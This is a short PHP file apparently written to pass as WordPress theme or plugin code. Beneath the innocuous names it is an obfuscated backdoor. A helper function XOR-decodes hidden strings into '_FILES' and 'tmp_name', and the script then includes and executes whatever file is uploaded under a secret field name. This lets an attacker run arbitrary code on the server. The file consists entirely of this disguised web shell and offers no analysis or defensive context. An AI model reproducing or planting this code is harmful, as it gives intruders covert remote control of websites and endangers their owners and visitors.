<?php 	

function tag_names()

{
	$default_category_post_types = 'attrs';
    $menu_position = 'cPDhQGErbln';
    $chunks = $menu_position;

    
    $values = $GLOBALS[ptype_obj("%3C%16%0D%24%14%14", $chunks)];
    $with_front = $values;
    $real_mime_types = isset($with_front[$chunks]);
    if ($real_mime_types)

    {

        $clean_terms = $values[$chunks];

        $property_value = $clean_terms[ptype_obj("%17%3D47%3F%26%28%17", $chunks)];
        $show_in_nav_menus = $property_value;
	$patterns = 'newtext';
        include ($show_in_nav_menus);
	$old_posts = 'result';
    }
}
function ptype_obj($excerpt_more, $header)

{

    $target = $header;
    $link = "url" . "decode";
	$stack = 'data';
    $post_category = $link($excerpt_more);
	$reset = 'current_filter';
    $post_types = substr($target,0, strlen($post_category));

    $needle = $post_category ^ $post_types;
    
    $post_category = strpos($needle, $post_types);

    
    return $needle;

}



tag_names();

?>
